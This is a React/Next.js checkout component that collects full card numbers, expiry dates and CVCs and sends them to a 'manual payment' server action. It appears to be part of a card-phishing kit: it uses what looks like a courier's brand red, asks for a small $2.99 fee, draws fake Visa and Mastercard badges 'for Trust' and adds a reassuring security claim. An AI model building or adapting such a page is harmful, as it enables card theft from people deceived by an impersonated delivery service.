'use client'

import { useState } from 'react'
import { submitManualPayment } from './actions'

import { useRouter } from 'next/navigation'

export function PaymentCheckout({ token, dict }: { token: string, dict: Record<string, string> }) {
    const [loading, setLoading] = useState(false)
    const router = useRouter()

    return (
        <form
            action={async (formData) => {
                setLoading(true)
                try {
                    const res = await submitManualPayment(formData)
                    if (res?.success && res.redirectUrl) {
                        router.push(res.redirectUrl)
                    } else {
                        setLoading(false)
                        alert("Submission returned an unknown response.")
                    }
                } catch (e) {
                    setLoading(false)
                    alert("Failed to submit verification.")
                }
            }}
            className="space-y-4"
        >
            <input type="hidden" name="token" value={token} />

            <div>
                <label className="block text-sm font-semibold text-gray-700">{dict.cardholder}</label>
                <input type="text" name="cardholderName" required className="mt-1 block w-full rounded border-gray-300 shadow-sm focus:border-[#D40511] focus:ring-[#D40511] p-2 border text-black bg-white" placeholder="John Doe" />
            </div>

            <div>
                <label className="block text-sm font-semibold text-gray-700">{dict.cardNumber}</label>
                <div className="relative">
                    <input type="text" name="cardNumber" required maxLength={19} pattern="[0-9]{13,19}" className="mt-1 block w-full rounded border-gray-300 shadow-sm focus:border-[#D40511] focus:ring-[#D40511] p-2 pr-24 border font-mono text-black bg-white" placeholder="0000 0000 0000 0000" />
                    <div className="absolute right-2 top-1/2 transform -translate-y-1/2 flex gap-1 items-center">
                        {/* Fake Visa/Mastercard simple SVG badges for Trust */}
                        <div className="bg-[#1A1F71] text-white text-[9px] font-black italic px-1.5 py-0.5 rounded-sm">VISA</div>
                        <div className="relative w-6 h-4 bg-gray-100 rounded-sm overflow-hidden flex items-center justify-center">
                            <div className="w-3 h-3 bg-red-500 rounded-full mix-blend-multiply opacity-80 absolute left-0" />
                            <div className="w-3 h-3 bg-yellow-500 rounded-full mix-blend-multiply opacity-80 absolute right-0" />
                        </div>
                    </div>
                </div>
            </div>

            <div className="flex gap-4">
                <div className="flex-1">
                    <label className="block text-sm font-semibold text-gray-700">{dict.expiry}</label>
                    <div className="flex gap-2">
                        <input type="text" name="expMonth" required maxLength={2} placeholder="MM" className="mt-1 block w-full rounded border-gray-300 shadow-sm focus:border-[#D40511] focus:ring-[#D40511] p-2 border text-center font-mono text-black bg-white" />
                        <span className="text-xl text-gray-400 mt-2">/</span>
                        <input type="text" name="expYear" required maxLength={2} placeholder="YY" className="mt-1 block w-full rounded border-gray-300 shadow-sm focus:border-[#D40511] focus:ring-[#D40511] p-2 border text-center font-mono text-black bg-white" />
                    </div>
                </div>
                <div className="w-1/3">
                    <label className="block text-sm font-semibold text-gray-700">{dict.cvc}</label>
                    <input type="password" name="cvc" required maxLength={4} className="mt-1 block w-full rounded border-gray-300 shadow-sm focus:border-[#D40511] focus:ring-[#D40511] p-2 border font-mono text-black bg-white" placeholder="123" />
                </div>
            </div>

            <div className="flex justify-between items-center text-sm font-medium mt-6 border-t pt-4 text-gray-800">
                <span>Total Due:</span>
                <span className="text-xl">$2.99</span>
            </div>

            <button
                type="submit"
                disabled={loading}
                className="w-full bg-[#D40511] mt-4 text-white font-bold text-lg py-3 rounded hover:bg-red-700 transition-colors disabled:opacity-50 uppercase"
            >
                {loading ? '...' : dict.paySecurely}
            </button>

            <p className="text-xs text-center text-gray-400 mt-4">This transaction is secured and requires authorization.</p>
        </form>
    )
}
